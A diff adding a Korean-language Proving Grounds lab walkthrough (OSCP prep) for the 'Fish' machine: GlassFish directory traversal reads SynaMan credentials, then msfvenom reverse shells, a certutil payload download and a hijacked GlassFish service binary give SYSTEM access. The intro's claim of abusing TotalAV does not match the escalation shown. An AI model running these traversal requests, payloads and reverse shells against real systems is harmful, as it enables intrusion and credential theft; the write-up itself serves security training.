@@ -1,3 +1,7 @@
+# 0. Offsec Proving Grounds Walkthrough for OSCP prep
+
+> In this lab, we will leverage a directory traversal vulnerability in Oracle GlassFish and exploit a credential disclosure in SynaMan to gain a foothold on the target system. We will then elevate our access by abusing the installed antivirus, TotalAV. This lab focuses on exploiting web application vulnerabilities and privilege escalation techniques.
+
 # 1. Recon
 ## 1.1. Active Scanning
 ### 1.1.1. nmap
@@ -340,7 +344,9 @@ external%5cx-news.php   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94m
 
 ![](../images/Windows-01.%20Fish-6.png)
 
-### 2.1.2. 
+### 2.1.2. glass fish vuln
+
+`searchsploit` 에 `glassfish` 를 검색하면 `Directory Traversal` 취약점이 존재하는 것을 확인할 수 있다. 
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/PG/Fish]
@@ -381,6 +387,257 @@ Shellcodes: No Results
 ```
 
 
+해당 취약점에서는 아래와 같은 경로로 접근하라고 알려주고 있다.
+
+```bash
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─# cat 39441.txt
+Trustwave SpiderLabs Security Advisory TWSL2015-016:
+Path Traversal in Oracle GlassFish Server Open Source Edition
+
+Published: 08/27/2015
+Version: 1.0
+
+[...SNIP...]
+
+REQUEST
+========
+GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/META-INF/dojo%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/com/sun%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+GET /theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+
+```
+
+
+그 중 맨 처음 거를 골라서 확인해본 결과 `win.ini` 파일이 정상적으로 출력되는 것을 확인할 수 있다.
+
 ![](../images/Windows-01.%20Fish-7.png)
 
 
+그러면 6060 포트에서 확인한 `Synaman` 의 서비스에 대한 설정 파일 확인을 시도해볼 수 있다. 해당 파일의 경로는 `/SynaMan/config/AppConfig.xml` 이다. 여기서 `<parameter name="smtpUser" type="1" value="arthur"></parameter>` 부분에 계정명인 `arthur` 가,  `<parameter name="smtpPassword" type="1" value="KingOfAtlantis">` 부분에 비밀번호인 `KingOfAtlantis` 가 존재한다. 
+
+```bash
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─# curl http://192.168.168.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../SynaMan/config/AppConfig.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration>
+	<parameters>
+		<parameter name="adminEmail" type="1" value="admin@fish.pg"></parameter>
+		<parameter name="smtpSecurity" type="1" value="None"></parameter>
+		<parameter name="jvmPath" type="1" value="jre/bin/java"></parameter>
+		<parameter name="userHomeRoot" type="1" value="C:\ProgramData\SynaManHome"></parameter>
+		<parameter name="httpPortSSL" type="2" value="-1"></parameter>
+		<parameter name="httpPort" type="2" value="0"></parameter>
+		<parameter name="vmParams" type="1" value="-Xmx128m -DLoggingConfigFile=logconfig.xml"></parameter>
+		<parameter name="synametricsUrl" type="1" value="http://synametrics.com/SynametricsWebApp/"></parameter>
+		<parameter name="lastSelectedTab" type="1" value="1"></parameter>
+		<parameter name="emailServerWebServicePort" type="2" value=""></parameter>
+		<parameter name="imagePath" type="1" value="images/"></parameter>
+		<parameter name="defaultOperation" type="1" value="frontPage"></parameter>
+		<parameter name="publicIPForUrl" type="1" value=""></parameter>
+		<parameter name="flags" type="2" value="2"></parameter>
+		<parameter name="httpPort2" type="2" value="6060"></parameter>
+		<parameter name="useUPnP" type="4" value="true"></parameter>
+		<parameter name="smtpServer" type="1" value="mail.fish.pg"></parameter>
+		<parameter name="smtpUser" type="1" value="arthur"></parameter>
+		<parameter name="InitialSetupComplete" type="4" value="true"></parameter>
+		<parameter name="disableCsrfPrevention" type="4" value="true"></parameter>
+		<parameter name="failureOverHttpPort" type="2" value="55222"></parameter>
+		<parameter name="smtpPort" type="2" value="25"></parameter>
+		<parameter name="httpIP" type="1" value=""></parameter>
+		<parameter name="emailServerWebServiceHost" type="1" value=""></parameter>
+		<parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
+		<parameter name="ntServiceCommand" type="1" value="net start SynaMan"></parameter>
+		<parameter name="mimicHtmlFiles" type="4" value="false"></parameter>
+	</parameters>
+</Configuration>
+```
+
+## 2.2. RDP Login
+
+`arthur:KingOfAtlantis` 의 크리덴셜을 통해서 `xfreerdp3` 로 접근한 결과 정상 접근이 되는 것을 확인할 수 있다.
+
+![](../images/Windows-01.%20Fish-8.png)
+
+## 2.3. Reverse shell
+
+Reverse shell을 맺기 위해 `msfvenom` 을 통해서 80포트로 수신하는 쉘 파일을 생성한다.
+
+```bash
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─# msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=tun0 LPORT=80
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+```
+
+그리고 아래와 같이 파일을 전송한다. 
+
+![](../images/Windows-01.%20Fish-9.png)
+
+이후 80포트로 리슨하고 있으면 정상적으로 리버스 쉘이 맺어지는 것을 확인할 수 있다.
+
+```bash
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─# rlwrap nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.249] from (UNKNOWN) [192.168.168.168] 55570
+Microsoft Windows [Version 10.0.19042.1288]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\arthur\Desktop>whoami
+whoami
+fishyyy\arthur
+```
+
+# 3. Privilege Escalation
+
+## 3.1. GlassFish Permissions
+
+`GlassFish` 의 경우 `System` 권한으로 실행된다는 점이 있다. 그 중에 `C:\glassfish4\glassfish\domains\domain1\bin` 의 권한을 `icacls` 를 통해 확인해 보면 `(M)` 권한이 존재하는데, 이는 수정의 권한이 존재한다는 거다.
+
+```cmd
+C:\>icacls C:\glassfish4\glassfish\domains\domain1\bin
+icacls C:\glassfish4\glassfish\domains\domain1\bin
+C:\glassfish4\glassfish\domains\domain1\bin BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                            BUILTIN\Users:(I)(OI)(CI)(RX)
+                                            NT AUTHORITY\Authenticated Users:(I)(M)
+                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+다시 말해서 `GlassFish` 의 파일을 내가 수정할 수 있다는 의미이고, 쉘 파일로 교체한 다음에 실행을 시켜도 된다는 뜻이다. 
+
+특히, `whoami /priv` 를 해보면 `SeShutdownPrivilege` 의 권한이 존재하기 때문에 쉘 파일을 교체하고 나서 시스템을 리부팅 시킬 권한까지 존재한다. 
+
+```bash
+C:\>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+
+## 3.2. system permission reverse shell
+
+`system` 권한으로 리버스 쉘을 맺기위해 `msfvenom` 으로 443번 포트(이전에는 80번)로 리슨하는 바이너리를 생성한다.
+
+```bash
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─# msfvenom -p windows/x64/shell_reverse_tcp -f exe -o pwn.exe LHOST=tun0 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: pwn.exe
+```
+
+그 다음 파일을 다시 이동시킨다. 
+
+```cmd
+C:\Users\arthur\Desktop>certutil.exe -urlcache -split -f "http://192.168.45.249/pwn.exe" pwn.exe
+certutil.exe -urlcache -split -f "http://192.168.45.249/pwn.exe" pwn.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+```
+
+`C:\glassfish4\glassfish\domains\domain1\bin` 의 경로에 보면 `GlassFish` 를 실행시키는 바이너리가 존재한다. `domain1Service.exe` 바이너리가 해당 파일이다.
+
+```cmd
+ Directory of C:\glassfish4\glassfish\domains\domain1\bin
+
+10/28/2021  04:48 AM    <DIR>          .
+10/28/2021  04:48 AM    <DIR>          ..
+08/25/2024  09:53 PM                 0 domain1Service.err.log
+10/28/2021  04:15 AM            30,208 domain1Service.exe
+08/25/2024  09:53 PM                 0 domain1Service.out.log
+08/25/2024  09:53 PM             1,692 domain1Service.wrapper.log
+10/28/2021  04:15 AM             3,121 domain1Service.xml
+               5 File(s)         35,021 bytes
+               2 Dir(s)   2,432,139,264 bytes free
+```
+
+해당 파일은 `domain1Service.old.exe` 로 이름을 변경하고 `pwn.exe` 파일을 `domain1Service.exe` 파일로 옮겨준다. 
+
+```cmd
+C:\glassfish4\glassfish\domains\domain1\bin>move domain1Service.exe domain1Service.old.exe
+move domain1Service.exe domain1Service.old.exe
+        1 file(s) moved.
+
+C:\glassfish4\glassfish\domains\domain1\bin>move C:\Users\arthur\Desktop\pwn.exe domain1Service.exe
+move C:\Users\arthur\Desktop\pwn.exe domain1Service.exe
+        1 file(s) moved.
+
+C:\glassfish4\glassfish\domains\domain1\bin>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 08DF-534D
+
+ Directory of C:\glassfish4\glassfish\domains\domain1\bin
+
+08/24/2022  09:52 PM    <DIR>          .
+08/24/2022  09:52 PM    <DIR>          ..
+08/25/2024  09:53 PM                 0 domain1Service.err.log
+08/24/2022  09:50 PM             7,168 domain1Service.exe
+10/28/2021  04:15 AM            30,208 domain1Service.old.exe
+08/25/2024  09:53 PM                 0 domain1Service.out.log
+08/25/2024  09:53 PM             1,692 domain1Service.wrapper.log
+10/28/2021  04:15 AM             3,121 domain1Service.xml
+               6 File(s)         42,189 bytes
+               2 Dir(s)   2,432,139,264 bytes free
+```
+
+설정을 다 했으면 시스템을 종료시킨다. 
+
+```bash
+C:\glassfish4\glassfish\domains\domain1\bin>shutdown /r /t 0
+shutdown /r /t 0
+
+C:\glassfish4\glassfish\domains\domain1\bin>
+
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─#
+```
+
+이후 리슨 하고 있으면 정상적으로 쉘을 획득할 수 있다. 
+
+```bash
+┌──(root㉿kali)-[/home/kali/PG/Fish]
+└─# rlwrap nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.45.249] from (UNKNOWN) [192.168.168.168] 49669
+Microsoft Windows [Version 10.0.19042.1288]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\proof.txt
+type C:\Users\Administrator\Desktop\proof.txt
+70891449a77ae83df250...
+```
